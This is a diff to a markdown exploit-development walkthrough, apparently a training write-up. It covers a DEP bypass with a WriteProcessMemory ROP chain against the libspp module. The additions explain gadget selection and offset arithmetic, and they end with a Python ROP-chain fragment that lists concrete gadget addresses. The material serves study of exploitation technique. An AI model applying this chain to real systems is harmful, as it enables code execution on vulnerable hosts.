@@ -144,6 +144,7 @@ And obtain the following output:
 We need to search space for the shellcode:
 
 ![imagen](https://github.com/user-attachments/assets/28d83696-c3c7-42d6-afba-19dd748871dc)
+
 ![imagen](https://github.com/user-attachments/assets/07e5dd08-0053-457a-8563-972a3561f0f6)
 
 Because of the nullbyte, add 4 to the address 0x10167a00 resulting the address 0x10167a04.
@@ -157,6 +158,7 @@ We use the `!dh` command to find the data section’s start address, supplying t
 We need to check the contents of the address to ensure they are not being used and to verify memory protections. Section headers must be aligned on a page boundary, so let’s dump the contents of the address just past the size value.
 
 ![imagen](https://github.com/user-attachments/assets/ddd71d00-6142-411e-9cb0-7e87b70d0ab1)
+
 ![imagen](https://github.com/user-attachments/assets/f0124769-6cbc-4a76-ba12-e904d8d982cc)
 
 Now we have a problem with the WriteProcessMemory address...
@@ -167,6 +169,7 @@ The IAT addresses that point to functions are static meaning the IAT Address of 
 So let's inspect the IAT with `!dh -f libspp` command:
 
 ![imagen](https://github.com/user-attachments/assets/ff42e42a-8604-44e4-b07a-7fa44ca67fd2)
+
 ![imagen](https://github.com/user-attachments/assets/7860cd87-f3b0-4700-9e3a-0a139c81c3be)
 
 As you can see, there is no WriteProcessMemory function in the output so we need to choose another function and calculate the offset to WPM.
@@ -240,4 +243,34 @@ def exploit():
 
 if __name__ == '__main__':
     exploit()
+```
+
+Before we encountered a "push esp" gadget but if esp includes badchars we would have problems pushing it to the stack, so we need to find a gadget that push and pop the esp before the "ret" instruction.
+
+![imagen](https://github.com/user-attachments/assets/ecdba7c5-ee8f-4cf5-b8e6-72e1690b2590)
+
+Now we have to calculate the negative offset between "esi" and our wpm's beginning:
+
+![imagen](https://github.com/user-attachments/assets/5593a8c5-0e64-4fb4-88c6-f0140dc046f9)
+
+![imagen](https://github.com/user-attachments/assets/fe8cab90-463c-4560-9dd4-2aacb4b16f30)
+
+So "esi - 0n36" is the top of our wpm skeleton.
+
+![imagen](https://github.com/user-attachments/assets/f90d2d28-8774-4c43-9e3b-53632c419df1)
+
+Now I want to move the value in EAX to other register, since we use EAX for arithmetic much more.
+
+Our ROP has the following appearance for now:
+
+```py
+# PUSH ESP and Realloc
+eip = pack("<L", 0x10154112)        # push esp ; inc ecx ; adc eax, 0x08468B10 ; pop esi ; ret  ;
+
+rop = pack('<L', 0x1013ada1)        # mov eax, esi ; pop esi ; ret
+rop += b"A" * 4                     # dummy for the ESI
+rop += pack('<L', 0x10151821)       # pop ebp ; ret
+rop += pack('<L', 0xffffffdc)       # -0n36
+rop += pack('<L', 0x100fcd71)       # add eax, ebp ; dec ecx ; ret
+rop += pack("<L", 0x100cb4d4)       # xchg eax, edx ; ret
 ```
